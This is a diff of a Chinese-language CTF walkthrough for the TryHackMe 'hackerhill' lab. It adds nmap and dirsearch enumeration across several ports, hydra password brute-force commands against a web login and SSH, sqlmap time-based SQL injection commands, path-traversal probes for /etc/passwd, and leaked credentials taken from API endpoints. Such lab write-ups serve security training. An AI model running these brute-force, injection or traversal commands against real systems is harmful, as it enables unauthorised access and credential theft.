@@ -541,10 +541,10 @@ nt authority\system
 服务发现
 ```
 ┌──(root💀kali)-[~/tryhackme/hackerhill]
-└─# nmap -sV -Pn 10.10.111.137    
+└─# nmap -sV -Pn 10.10.83.126    
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-28 04:04 EDT
-Nmap scan report for 10.10.111.137
+Nmap scan report for 10.10.83.126
 Host is up (0.33s latency).
 Not shown: 993 closed ports
 PORT     STATE SERVICE VERSION
@@ -565,18 +565,18 @@ PORT     STATE SERVICE VERSION
 目录爆破
 ```
 ┌──(root💀kali)-[~/dirsearch]
-└─# python3 dirsearch.py -e* -t 100 -u http://10.10.111.137                                                                      
+└─# python3 dirsearch.py -e* -t 100 -u http://10.10.83.126                                                                      
 
   _|. _ _  _  _  _ _|_    v0.4.2
  (_||| _) (/_(_|| (_| )
 
 Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492
 
-Output File: /root/dirsearch/reports/10.10.111.137/_21-10-28_04-15-43.txt
+Output File: /root/dirsearch/reports/10.10.83.126/_21-10-28_04-15-43.txt
 
 Error Log: /root/dirsearch/logs/errors-21-10-28_04-15-43.log
 
-Target: http://10.10.111.137/
+Target: http://10.10.83.126/
 
 [04:15:44] Starting: 
                                        
@@ -618,30 +618,131 @@ login页面源代码显示，如果成功登录，将被导向一个token页面,
 
 看样子像是一个servermanager数据库的登陆页面。不知道用户名
 
-hydra -f -V -l hill -P /usr/share/wordlists/rockyou.txt 10.10.111.137 http-post-form "/api/user/login:username=^USER^&password=^PASS^&Login=Login:Invalid username"
+继续对/api/user爆破
+```
+┌──(root💀kali)-[~/tryhackme/dirsearch]
+└─# python3 dirsearch.py -e* -t 100 -u http://10.10.83.126/api/user
+
+  _|. _ _  _  _  _ _|_    v0.4.2
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492
+
+Output File: /root/tryhackme/dirsearch/reports/10.10.83.126/-api-user_21-10-28_09-49-39.txt
+
+Error Log: /root/tryhackme/dirsearch/logs/errors-21-10-28_09-49-39.log
+
+Target: http://10.10.83.126/api/user/
+
+[09:49:41] Starting: 
+[09:51:22] 200 -   53B  - /api/user/login                                   
+[09:51:22] 200 -   53B  - /api/user/login/                                  
+[09:51:44] 200 -   91B  - /api/user/session/                                
+[09:51:44] 200 -   91B  - /api/user/session
+```
+
+```/api/user/session/```打印
+
+>{"active_sessions":[{"id":1,"username":"admin","hash":"1b4237f476826986da63022a76c35bb1"}]}
+
+
+貌似可以肯定用户名就是admin
+1b4237f476826986da63022a76c35bb1是md5密文,解密以后是：dQw4w9WgXcQ
+
+然而```admin:dQw4w9WgXcQ```不能登录
+
+what the fuck....
+
+这串古怪的符号和youtube上的这个视频的id居然一样：
+>https://www.youtube.com/watch?v=dQw4w9WgXcQ
+ 视频是Rick Astley - Never Gonna Give You Up (Official Music Video)，不知道是作者在叫我不要放弃还是有什么提示。。。
+
+
+hydra -f -V -l admin -P /usr/share/wordlists/rockyou.txt 10.10.83.126 http-post-form "/api/user/login:username=^USER^&password=^PASS^&Login=Login:Invalid username"
 
 davelarkin
 
-hydra -f -V -l davelarkin -P /usr/share/wordlists/rockyou.txt 10.10.111.137 ssh
+hydra -f -V -l davelarkin -P /usr/share/wordlists/rockyou.txt 10.10.83.126 ssh
 
 
 sqlmap -r data --technique T --level=5 --risk=3 --dbms=mysql -p "password"
 
+
+
+# 81端口
+目录爆破
+```
+┌──(root💀kali)-[~/tryhackme/dirsearch]
+└─# python3 dirsearch.py -u http://10.10.83.126:81/ -e* -t 100
+
+  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                                                                                                             
+ (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                      
+                                                                                                                                                                                                                                             
+Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492
+
+Output File: /root/tryhackme/dirsearch/reports/10.10.83.126-81/-_21-10-28_08-54-57.txt
+
+Error Log: /root/tryhackme/dirsearch/logs/errors-21-10-28_08-54-57.log
+
+Target: http://10.10.83.126:81/
+
+[08:54:59] Starting:  
+[08:55:40] 200 -  409KB - /access_log                                       
+[08:55:52] 301 -  178B  - /images  ->  http://10.10.83.126/images/          
+[08:55:52] 403 -  564B  - /images/                                          
+                                                                             
+Task Completed    
+```
+
+/access_log 第一个访问记录暴露一个文件夹```/s3cr3t_area```,打开是一张图片，下载到本地后用binwalk发现有zlib文件
+
+
+
+
 # 82端口
+目录爆破
+```
+┌──(root💀kali)-[~/tryhackme/dirsearch]
+└─# python3 dirsearch.py -u http://10.10.83.126:82/ -e* -t 100           2 ⨯
+
+  _|. _ _  _  _  _ _|_    v0.4.2
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak
+HTTP method: GET | Threads: 100 | Wordlist size: 15492
+
+Output File: /root/tryhackme/dirsearch/reports/10.10.83.126-82/-_21-10-28_08-49-12.txt
+
+Error Log: /root/tryhackme/dirsearch/logs/errors-21-10-28_08-49-12.log
+
+Target: http://10.10.83.126:82/
+
+[08:49:13] Starting: 
+[08:49:32] 400 -  304B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd                                                                                            
+[08:50:35] 400 -  304B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd                                                                                                                                                                      
+[08:50:50] 200 -   21B  - /feed                                                           
+[08:50:55] 301 -  316B  - /images  ->  http://10.10.83.126:82/images/                                                  
+[08:51:23] 200 -    2KB - /search                                                            
+[08:51:31] 301 -    0B  - /t  ->  /t/      
+```
+
+在```http://10.10.83.126:82/t/r/y/h/a/r/d/e/r/spamlog.log```找到信息
+>Nahamsec made me do it :(
+
 一个搜索框，在burpsuite上把搜索请求信息截取出来,保存到data2文件
 ```
 └─# cat data2              
 POST /search HTTP/1.1
-Host: 10.10.111.137:82
+Host: 10.10.83.126:82
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 3
-Origin: http://10.10.111.137:82
+Origin: http://10.10.83.126:82
 Connection: close
-Referer: http://10.10.111.137:82/search
+Referer: http://10.10.83.126:82/search
 Upgrade-Insecure-Requests: 1
 
 q=a
@@ -665,4 +766,42 @@ sqlmap -r data2 --level=5 --risk=3  --dbms=mysql
 当前用户角色和权限： USAGE （最低权限）
 os-shell:无法获取
 
+
+
+# 8888端口
+爆破目录
+```
+┌──(root💀kali)-[~/tryhackme/dirsearch]
+└─# python3 dirsearch.py -e* -t 100 -u http://10.10.83.126:8888
+
+  _|. _ _  _  _  _ _|_    v0.4.2
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak
+HTTP method: GET | Threads: 100 | Wordlist size: 15492
+
+Output File: /root/tryhackme/dirsearch/reports/10.10.83.126-8888/_21-10-28_09-36-47.txt
+
+Error Log: /root/tryhackme/dirsearch/logs/errors-21-10-28_09-36-47.log
+
+Target: http://10.10.83.126:8888/
+
+[09:36:47] Starting: 
+[09:38:05] 200 -  135B  - /apps                                             
+[09:39:19] 200 -   45B  - /users                                            
+                                                                             
+Task Completed
+```
+/apps打印:
+```
+{"app1": {"name": "online file storage"}, "app2": {"name": "media player"}, "app3": {"name": "file sync"}, "app4": {"name": "/users"}}
+
+```
+
+
+/users打印：
+```
+{"user": {"davelarkin": "totallysecurehuh"}}
+
+```
 
